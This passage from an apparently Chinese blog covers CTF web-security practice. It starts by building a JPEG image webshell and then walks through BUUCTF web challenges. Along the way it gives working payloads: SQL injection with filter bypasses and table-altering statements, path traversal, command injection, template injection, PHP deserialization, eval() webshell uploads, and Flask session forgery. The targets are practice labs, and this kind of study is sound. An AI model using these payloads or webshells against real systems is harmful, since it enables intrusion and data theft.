class=\"variable\">$byte</span> = substr(<span class=\"keyword\">$this</span>-&gt;binData, <span class=\"number\">0</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;binData = substr(<span class=\"keyword\">$this</span>-&gt;binData, <span class=\"number\">1</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> ord(<span class=\"variable\">$byte</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">readShort</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(strlen(<span class=\"keyword\">$this</span>-&gt;binData) &lt; <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;End Of File&#x27;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"variable\">$short</span> = substr(<span class=\"keyword\">$this</span>-&gt;binData, <span class=\"number\">0</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;binData = substr(<span class=\"keyword\">$this</span>-&gt;binData, <span class=\"number\">2</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"keyword\">$this</span>-&gt;order) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$short</span> = (ord(<span class=\"variable\">$short</span>[<span class=\"number\">1</span>]) &lt;&lt; <span class=\"number\">8</span>) + ord(<span class=\"variable\">$short</span>[<span class=\"number\">0</span>]);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$short</span> = (ord(<span class=\"variable\">$short</span>[<span class=\"number\">0</span>]) &lt;&lt; <span class=\"number\">8</span>) + ord(<span class=\"variable\">$short</span>[<span class=\"number\">1</span>]);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"variable\">$short</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">eof</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> !<span class=\"keyword\">$this</span>-&gt;binData||(strlen(<span class=\"keyword\">$this</span>-&gt;binData) === <span class=\"number\">0</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"准备-1\"><a href=\"#准备-1\" class=\"headerlink\" title=\"准备\"></a>准备</h4><p>​    准备一个<strong>yoo.jpg</strong>图片，上传经过渲染以后再下载下到本地，保存为<strong>1.jpg</strong>。</p>\n<h4 id=\"插入代码\"><a href=\"#插入代码\" class=\"headerlink\" title=\"插入代码\"></a>插入代码</h4><p>​    使用脚本处理<strong>1.jpg</strong>插入php代码，执行命令<code>php jpg_payload.php 1.jpg</code>。php命令执行方法上面有。执行成功以后应该如图所示：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116212640.png\"></p>\n<p>​    执行的目录下会多出一个名为<code>payload_1.jpg</code>的文件，这就是制作好的图片马。大佬的源码我是修改了一下的，可以修改上面的第25行代码，自定义插入想要的代码。</p>\n<h4 id=\"上传并验证\"><a href=\"#上传并验证\" class=\"headerlink\" title=\"上传并验证\"></a>上传并验证</h4><p>​    上传以后同样先确定图片的名称和地址，适用文件包含进行验证</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116215008.png\"></p>\n<p>​    如果如图所示，我们的图片马就上传成功了。<strong>需要提醒：有些图片不行可能需要多换几个图片试一试！！！</strong></p>\n<p>呼，终于可以休息了。</p>\n"},{"title":"BUUCTF寒假刷题-Web","date":"2021-01-18T08:58:56.000Z","cover":"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201120223242.jpg","_content":"\n寒假横向刷题（尽量）\n[BUUCTF](https://buuoj.cn/challenges#)\n💗🧡💛💚💙💜🤎🖤🤍\n**题都写这一个里面了，可以先用<kbd>Ctrl</kbd>+<kbd>F</kbd>搜索，还有部分是草稿还没有整理，不过我认为的思路已经整理出来了，看不懂还请大伙见谅。有问题了很乐意效劳💨** \n\n# 2021.01.15\n\n# [HCTF 2018]WarmUp\n\n进到靶机一个硕大的滑稽，查看源码有提示source.php\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101413.png)\n\n```\n<?php\n    highlight_file(__FILE__);\n    class emmm\n    {\n        public static function checkFile(&$page)\n        {\n            $whitelist = [\"source\"=>\"source.php\",\"hint\"=>\"hint.php\"];\n            if (! isset($page) || !is_string($page)) {\n                echo \"you can't see it\";\n                return false;\n            }\n\n            if (in_array($page, $whitelist)) {\n                return true;\n            }\n\n            $_page = mb_substr(\n                $page,\n                0,\n                mb_strpos($page . '?', '?')\n            );\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n\n            $_page = urldecode($page);\n            $_page = mb_substr(\n                $_page,\n                0,\n                mb_strpos($_page . '?', '?')\n            );\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n            echo \"you can't see it\";\n            return false;\n        }\n    }\n\n    if (! empty($_REQUEST['file'])\n        && is_string($_REQUEST['file'])\n        && emmm::checkFile($_REQUEST['file'])\n    ) {\n        include $_REQUEST['file'];\n        exit;\n    } else {\n        echo \"<br><img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" />\";\n    }  \n?>\n```\n\n发现白名单有source.php和hint.php，先去查看一下hint.php\n\n> flag not here, and flag in ffffllllaaaagggg\n\n分析源码\n\n* 判断`$_REQUEST['file']`对象为空且为字符串\n* 执行emmm类中的**checkFile**方法判断是否在白名单（确保函数返回是true）\n* 文件包含\n\ncheckFile函数中字符串截取判断是否在白名单（代码17-24和26-34）所以有两种绕过方法。\n\n1. 第一种\n\n```\nfile=hint.php?../../../../../ffffllllaaaagggg\n```\n\n字符串截取将原字符串尾部加上`?`再截取第一个`?`之前的内容。所以需要在构造payload时问号前需要是白名单里的文件。问号之后，猜测flag位置在根目录下，所以使用尽可能多的`../`返回上级目录。\n\n2.  第二种\n\n```\nhint.php%3F..%2F..%2F..%2F..%2F..%2Fffffllllaaaagggg\n```\n\n将第一种payload使用urlencode编码即可。\n\n--------------------\n\n# [强网杯 2019]随便注\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120094248.png)\n\n根据题目尝试sql注入，单引号报错，单引号加注释无报错，说明存在sql注入，当测试输入select时返回过滤的黑名单：\n\n```\nreturn preg_match(\"/select|update|delete|drop|insert|where|\\./i\",$inject);\n```\n\n这道题使用的是堆叠注入，原理\n\n> 在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。\n\n查看数据库\n\n```\n1';show databases;\n```\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095211.png)\n\n查看当前库下的表\n\n```\n1';show tables;\n```\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095339.png)\n\n查看两张表字段\n\n```\n1';show columns from words;\n```\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095607.png)\n\n还有一种查看表的语句，在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符\n\n```\n1';desc `1919810931114514`;\n```\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095839.png)\n\n找到了flag在的字段，接下来就是如何获取该字段的值。顺带一提，根据表的结构，初步判断默认查询的是**word**表中的字段，而flag在**1919810931114514**表中。\n\n网上找到的两种方法，分别是修改表名和使用预处理语句。\n\n1. 使用[预处理](https://www.cnblogs.com/geaozhang/p/9891338.html)语句\n\n因为select被过滤了，但是可以使用char函数，char() 函数将select的ASCII码转换为select字符串，接着利用concat()函数进行拼接得到select查询语句，从而绕过过滤。或者直接用concat()函数拼接select来绕过。\n\n```\nchar(115,101,108,101,99,116)\n```\n\n根据预处理语句格式构造payload\n\n* 创建一个**sqli**字符串值为查询sql语句，使用预处理语句赋值并执行。\n\n```\n1';SET @sqli=concat(char(115,101,108,101,99,116),'* from `1919810931114514`');PREPARE hacker from @sqli;EXECUTE hacker;#\n```\n\n* 不使用变量\n\n```\n1';PREPARE sqli FROM CONCAT('s','elect',' * from `1919810931114514`');EXECUTE sqli; #\n```\n\n* 还有一种\n\n```\n1';SET @sqli = CONCAT('s','e','l','e','c','t',' * from `1919810931114514`');PREPARE haha FROM@sqli ;EXECUTE haha; #\n```\n\n主要区别在于过滤的绕过方式，不要拘泥于一种方式。\n\n2. 修改表名\n\n修改表名的思路是：默认查询的是**word**表第一个字段，所以把**word**表修改为其他名称，将flag所在的**1919810931114514**表名修改为**word**。\n\n网上payload\n\n```\n0';rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#\n```\n\n自己构造的payload\n\n```\n0';rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) #\n```\n\n之后执行\n\n```\n1' or 1=1 #\n```\n\n查询表所有字段值即可。\n\n---------------\n\n# [极客大挑战 2019]EasySQL\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101528.png)\n\n用户名密码，尝试万能密码。\n\n```\n'or 1=1 #\n随便密码\n```\n\n一个万能密码的参考:https://www.cnblogs.com/pass-A/p/11134988.html\n\n---------------------\n\n# [极客大挑战 2019]Havefun\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101733.png)\n\n直接源码找到php代码。payload\n\n```\n?cat=dog\n```\n\n------------------------\n\n# [SUCTF 2019]EasySQL\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120102317.png)\n\n单引号无报错，尝试堆叠注入可以回显。\n\n和 [强网杯 2019]随便注这道题一样查库查表查字段\n\n```\n1;show databases;\n1;show tables;\n```\n\n但是执行\n\n```\n1;desc `Flag`;\n1;show columns from Flag;\n```\n\n返回了\"Nonono.“测试出被过滤了：desc、from、Flag。\n\n接下来的都是抄网上的预期解也是第一次见。\n\n比赛时源码泄露\n\n```\nselect $_GET['query'] || flag from flag\n```\n\n> 在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode\n> 模式：pipes_as_concat 来实现oracle 的一些功能\n\npayload\n\n```\n1;set sql_mode=PIPES_AS_CONCAT;select 1\n```\n\n非预期解\n\n```\n*,1 \n```\n\n----------------------\n\n# [ACTF2020 新生赛]Include\n\n不截图了，进入靶机只有一个**tips**等着被点。跳转以后看url中参数\n\n```\n?file=flag.php\n```\n\n页面内容只有\n\n> Can you find out the flag?\n\n立马想到使用php伪协议读文件内容。使用filter过滤器\n\n```\n?file=php://filter/convert.base64-encode/resource=flag.php\n```\n\n得到\n\n```\nPD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7OTAyNTIyNDgtMjY3NC00NDdjLWFlYWMtYjc3ZTc5YjYwMzVmfQo=\n```\n\n解密得到flag\n\n-------------------------\n\n# [极客大挑战 2019]Secret File\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103724.png)\n\n查看源码，又一个背景是黑色的超链接跳转到 Archive_room.php。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103842.png)\n\n查看源码SECRET跳转的是action.php。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103907.png)\n\n但是跳转以后是url地址为end.php，所以中间跳过了一个页面，使用bp抓包查看。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120104246.png)\n\nstristr()函数返回字符串中子串第一次出现位置之后的内容，简而言之还是过滤。\n\n同样使用php伪协议filter过滤器读取文件\n\n```\n?file=php://filter/convert.base64-encode/resource=flag.php\n```\n\n```\nPCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7ZmZjZTAwNWYtYjEyOS00YWM1LTg3MzYtZDM3YzUwYjYxNjZkfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=\n```\n\n解密得到网页源码，flag在其中。\n\n-------------------\n\n# [极客大挑战 2019]LoveSQL\n\n顶端の告诫：用 sqlmap 是没有灵魂的\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120104703.png)\n\n尝试万能密码（其实没卵用）\n\n```\n'or 1=1 #\n任意密码\n```\n\n这道题是常规的sql注入，测注入点、查字段数、爆库、爆字段值、爆表。组合拳\n\n字段数：\n\n```\n1' order by 3 #\n```\n\n爆库：\n\n```\n1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #\n\ngeekuser,l0ve1ysq1\n```\n\n爆字段值：\n\n```\n1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1' #\n\nid,username,password\n```\n\n爆表：\n\n```\n1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1 #\n\n'1cl4ywo_tai_nan_le,2glzjinglzjin_wants_a_girlfriend,3Z4cHAr7zCrbiao_ge_dddd_hm,40xC4m3llinux_chuang_shi_ren,5Ayraina_rua_rain,6Akkoyan_shi_fu_de_mao_bo_he,7fouc5cl4y,8fouc5di_2_kuai_fu_ji,9fouc5di_3_kuai_fu_ji,10fouc5di_4_kuai_fu_ji,11fouc5di_5_kuai_fu_ji,12fouc5di_6_kuai_fu_ji,13fouc5di_7_kuai_fu_ji,14fouc5di_8_kuai_fu_ji,15leixiaoSyc_san_da_hacker,16flagflag{c4e8849c-e0e3-4e0d-b701-26a5abeec46a}'\n```\n\n--------\n\n# 2021.01.21\n\n# [GXYCTF2019]Ping Ping Ping\n\n[传送门](https://braindance.tk/2020/%5BGXYCTF2019%5DPing%20Ping%20Ping/)\n\n--------\n\n# [ACTF2020 新生赛]Exec\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121090002.png)\n\n肯定是尝试管道符\n\n```\n127.0.0.1|cat /flag\n```\n\n------\n\n# [护网杯 2018]easy_tornado\n\n打开页面三个超链接\n\n> /flag.txt\n>\n> /welcome.txt\n>\n> hints.txt\n\n内容分别是\n\n> flag in /fllllllllllllag\n>\n> render\n>\n> md5(cookie_secret+md5(filename))\n\n进入hints.txt注意到url地址此时为\n\n```\n/file?filename=/hints.txt&filehash=2a84a09bc1d5e3d8745131754ff208fa\n```\n\n再根据hints.txt文件的内容，推断可以使用url方式访问文件，但是需要提供**filehash**值，加密的方法即hints.txt的内容：md5(cookie_secret+md5(filename))。flag文件的名称`filename`有了，接下来就是获取`cookie_secret`的值。\n\n接下来触及到盲区了，获取cookie_secret是看wp。\n\n> render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用\n\n> 在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量\n\n获取cookie_secret的payload\n\n```\n/error?msg={{handler.settings}}\n```\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121091616.png)\n\n获得cookie_secret的值为\n\n```\neb326d39-cd67-47bd-b2d3-71125996417b\n```\n\n根据hints.txt的url验证一下是如何加密的。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092122.png)\n\n选中的蓝色部分是`/hints.txt`加密后的md5值。推断出filehash格式以后直接访问flag文件，payload：\n\n```\n/file?filename=/hints.txt&filehash=2a84a09bc1d5e3d8745131754ff208fa\n```\n\n-----\n\n# [极客大挑战 2019]Knife\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092431.png)\n\n一句话直接连。\n\n-----\n\n# [RoarCTF 2019]Easy Calc\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092956.png)\n\n一个计算器随便试一试，当输入字母时会报错。查看网页源码，在script中发现了运行计算器的php文件：**calc.php**，但是也有一句很重要的注释\n\n```\n<!--I've set up WAF to ensure security.-->\n```\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121093233.png)\n\nphp的正则表达式中并没有过滤字母的条件，所以我们输入字母被过滤是因为**WAF**，接下来是参考网上的wp自己的理解\n\n可以在calc.php传参\n\n```\n? num=a\n```\n\nphp会输出一个值a，说明已经绕过了WAF。这里使用的是WAF和php解析方法不一样，WAF解析到空格' '会直接过滤掉，这样WAF认为传入的就是一个空值，并不会识别num，但是php解析的时候会把空格去掉，这样就能get到num的值。\n\n接下来绕过正则就可以使用char()的方式使用ascii码转。空格被过滤但是想使用php输出可以使用var_dump()\n\n查看根目录下文件，可以使用scandir（）遍历文件夹，其中char（47）------>   '/'  ：\n\n```\n? num=1;var_dump(scandir(chr(47)))\n```\n\n找到了疑似flag文件：f1agg，使用file_get_contents（）读取文件\n\n```\n?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))\n```\n\n-----\n\n# [极客大挑战 2019]Http\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121104213.png)\n\n查看源码在\"氛围\"这两个字上有隐藏的跳转Secret.php。进入以后页面显示\n\n```\nIt doesn't come from 'https://www.Sycsecret.com'\n```\n\n提示页面不是来自这个网址，所以在HackBar上加上Referer。之后又提示\n\n```\nPlease use \"Syclover\" browser\n```\n\n加上User-Agent。提示\n\n```\nNo!!! you can only read this locally!!!\n```\n\n加上X-Forwarded-For。[HTTP X-Forwarded-For 介绍](https://www.runoob.com/w3cnote/http-x-forwarded-for.html)\n\n最终的请求头：\n\n```\nGET /Secret.php HTTP/1.1\nHost: node3.buuoj.cn:26715\nUpgrade-Insecure-Requests: 1\nUser-Agent: Syclover\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nx-forwarded-for: 127.0.0.1\nreferer: https://www.Sycsecret.com\nConnection: close\n```\n\n-----\n\n# [极客大挑战 2019]PHP\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121105104.png)\n\n源码备份在`www.zip`中。下载以后有五个文件\n\n> class.php\n>\n> flag.php\n>\n> index.js\n>\n> index.php\n>\n> style.css\n\n在index.php中有一段代码\n\n```\n<?php\n    include 'class.php';\n    $select = $_GET['select'];\n    $res=unserialize(@$select);\n    ?>\n```\n\n再结合又一个class.php，所以这道题考点应该是反序列化。\n\nclass.php\n\n```\n<?php\ninclude 'flag.php';\n\n\nerror_reporting(0);\n\n\nclass Name{\n    private $username = 'nonono';\n    private $password = 'yesyes';\n\n    public function __construct($username,$password){\n        $this->username = $username;\n        $this->password = $password;\n    }\n\n    function __wakeup(){\n        $this->username = 'guest';\n    }\n\n    function __destruct(){\n        if ($this->password != 100) {\n            echo \"</br>NO!!!hacker!!!</br>\";\n            echo \"You name is: \";\n            echo $this->username;echo \"</br>\";\n            echo \"You password is: \";\n            echo $this->password;echo \"</br>\";\n            die();\n        }\n        if ($this->username === 'admin') {\n            global $flag;\n            echo $flag;\n        }else{\n            echo \"</br>hello my friend~~</br>sorry i can't give you the flag!\";\n            die();\n\n            \n        }\n    }\n}\n?>\n```\n\n获取flag的代码位置是30-32行。分析这个Name对象，创建对象时可以为对象赋值，对象销毁时会判断password值是否是100，且username值是否为admin，如果两者都成立输出flag，但是__wakeup（）会在反序列化时调用将username值置为guest，所以需要反序列化逃逸。这里面有反序列化讲解[CVE-2016-7124漏洞复现](https://www.cnblogs.com/zy-king-karl/p/11436872.html)\n\n我使用的构造对象\n\n```\n<?php\nclass Name{\n    private $username ='admin';\n    private $password ='100';\n}\n\n$a = new Name;\necho serialize($a);\n\nO:4:\"Name\":2:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";s:3:\"100\";}\n```\n\n反序列化逃逸，使对象属性的数量大于原来的值，就可以绕过wakeup函数。最终payload\n\n```\n?select=O:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";s:3:\"100\";}\n```\n\n---\n\n# [极客大挑战 2019]Upload\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121111429.png)\n\n先尝试上传一个gif图片马内容为\n\n```\nGIF89a\n<?php\n@eval($_POST['a']);\n```\n\n页面提示过滤：\n\n>  NO! HACKER! your file included '<?'\n\n尝试script执行php代码\n\n```\n<script language=\"php\">eval($_POST['cmd'])</script>\n```\n\n可以上传，文件在/upload目录下。尝试修改后缀上传，phtml上传成功，可以执行php和script代码，使用蚁剑连接。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121112135.png)\n\n---\n\n# 2021.01.28\n\n# [极客大挑战 2019]BabySQL\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210128113412.png)\n\n尝试万能密码，发现报错了：1=1#' and password='123'，也许是or被过滤了或者删掉了，尝试大小写无果，但是尝试双写通过了。需要注意的是爆表，爆数据库的语句中有**information**这个词，其中的**for**也会被过滤。其他过滤的词我遇到的有：union，select、from、where、and。\n\n爆数据库（填密码）：\n\n```\n1' uniunionon selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database() #\n```\n\n爆表：\n\n```\n1' uniunionon selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema=database() aandnd table_name='b4bsql' #\n```\n\n爆字段值：\n\n```\n1' uniunionon selselectect 1,2,group_concat(id,username,passwoorrd) ffromrom b4bsql #\n```\n\n---\n\n# [ACTF2020 新生赛]Upload\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210128114257.png)\n\n指针放在灯泡上护显示上传文件的，图片马\n\n233.gif\n\n```\nGIF89a\n<?php\n@eval($_POST['a']);\n```\n\n尝试phtml是否被过滤，直接上传成功。蚁剑连接\n\n```\n------WebKitFormBoundaryUMSByAQmR2cduL6R\nContent-Disposition: form-data; name=\"upload_file\"; filename=\"233.phtml\"\nContent-Type: image/gif\n\nGIF89a\n<?php\n@eval($_POST['a']);\n------WebKitFormBoundaryUMSByAQmR2cduL6R\nContent-Disposition: form-data; name=\"submit\"\n\nupload\n------WebKitFormBoundaryUMSByAQmR2cduL6R--\n\n```\n\n---\n\n\n\n# [ACTF2020 新生赛]BackupFile\n\n```\nTry to find out source file!\n```\n\n题目提示备份文件，备份文件常见后缀：\n\n> .git .svn .swp .~ .bak .bash_history\n\n尝试index.php.bak，下载了一个备份文件：\n\n```\n<?php\ninclude_once \"flag.php\";\n\nif(isset($_GET['key'])) {\n    $key = $_GET['key'];\n    if(!is_numeric($key)) {\n        exit(\"Just num!\");\n    }\n    $key = intval($key);\n    $str = \"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3\";\n    if($key == $str) {\n        echo $flag;\n    }\n}\nelse {\n    echo \"Try to find out source file!\";\n}\n```\n\n传一个必须为数字的参数key，使用intval（）函数处理，字符串相等则输出flag。这就想到了PHP中的`==`和`===`的区别。贴一段简单代码\n\n```\n<?php\n$str = 'abc';\nif(0==$str){\n\techo \"真\";\n}else{\n\techo \"假\";\n}\n```\n\n`==`在执行关系运算时，要求运算符两边的数据类型必须一致，所以等号右边的字符串被强制转换为了整型，若有一方为数字，另一方为字符串或空或null，均会先将非数字一方转化为0，再做比较。如果字符串是以数字开头的，就会截取直到遇到第一个字母。\n\n全等于`===`操作过程如下： \n\n1. 操作符两边的数据类型如果不相同，返回false 。\n2. 操作符两边的值如果不相同，返回false 。\n3. 最后将上面2步的操作进行与操作。返回与操作的结果。\n\n所以最终的payload：\n\n```\n?key=123\n```\n\n\n\n---\n\n# [HCTF 2018]admin\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210202182820.png)\n\n可以在注释里找到\n\n> <!-- you are not admin -->\n\n思路应该是只要我们是admin登陆就可以得到flag，可以找到注册按钮，不能注册admin,那就随便注册一个进去看看。找到几个功能。\n\n* post。发表文章，但是没能找到在哪里打开\n* change password。改密码，尝试下能不能抓包改到admin的密码\n\n修改密码抓到的包：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210202183647.png)\n\n感觉并没有什么下手的地方，唯一的就是session可能和身份有关。\n\n以下的是看网上的wp\n\n在change password页面查看源码，发现提供了题目的源码地址\n\n```html\n<!-- https://github.com/woadsl1234/hctf_flask/ -->\n```\n\n网站使用的是flask框架，具体路由表如下\n\n```python\n@app.route('/code')\t\t#二维码\ndef get_code():\n\n@app.route('/index')\t\t#首页\ndef index():\n\n@app.route('/register', methods = ['GET', 'POST'])\t\t#注册\ndef register():\n\n@app.route('/login', methods = ['GET', 'POST'])\t\t#登陆\ndef login():\n\n@app.route('/logout')\t\t#登出\ndef logout():\n\n@app.route('/change', methods = ['GET', 'POST'])\t\t#修改密码\ndef change():\n\n@app.route('/edit', methods = ['GET', 'POST'])\t\t#编辑信息\ndef edit():\n```\n\n## 解法一：flask session伪造\n\n这个解法和前面查看请求头时发现的session有关，flask框架是通过session来判断登录的用户身份，但是这个session是通过一些字符串拼接后加密的，所以如果我们可以知道字符串和加密算法，就可以实现伪造session。\n\n贴两篇相关文章：\n\n[Python Web之flask session&格式化字符串漏洞](https://xz.aliyun.com/t/3569)\n\n[客户端 session 导致的安全问题](https://www.leavesongs.com/PENETRATION/client-session-security.html#)\n\n首先需要注册一个账号登陆上去，看看请求头Cookie里的session值。\n\n说明一下flask的session值加密格式是：`SECRET_KEY` +`一个用户对象的字符串`(就像PHP里的序列化后)。`SECRET_KEY`的值我们可以在源码里找到：https://github.com/woadsl1234/hctf_flask/blob/master/app/config.py中的第四行\n\n```\nSECRET_KEY = os.environ.get('SECRET_KEY') or 'ckj123'\n```\n\n可以得知`SECRET_KEY`值为`ckj123`。然后在index.html页面发现只要session[‘name’] == 'admin’即可以得到flag。接下来就要使用到一个解密工具，需要解密出用户字符串的格式，再将用户名改为admin，加密后再去请求，我们就可以以admin的身份登陆了。\n\n如下 [**P师傅**](https://www.leavesongs.com/) 的程序解密：\n\n```python\n#!/usr/bin/env python3\nimport sys\nimport zlib\nfrom base64 import b64decode\nfrom flask.sessions import session_json_serializer\nfrom itsdangerous import base64_decode\n\ndef decryption(payload):\n    payload, sig = payload.rsplit(b'.', 1)\n    payload, timestamp = payload.rsplit(b'.', 1)\n\n    decompress = False\n    if payload.startswith(b'.'):\n        payload = payload[1:]\n        decompress = True\n\n    try:\n        payload = base64_decode(payload)\n    except Exception as e:\n        raise Exception('Could not base64 decode the payload because of '\n                         'an exception')\n\n    if decompress:\n        try:\n            payload = zlib.decompress(payload)\n        except Exception as e:\n            raise Exception('Could not zlib decompress the payload before '\n                             'decoding the payload')\n\n    return session_json_serializer.loads(payload)\n\nif __name__ == '__main__':\n    print(decryption(sys.argv[1].encode()))\n```\n\n执行命令\n\n```\npython run.py 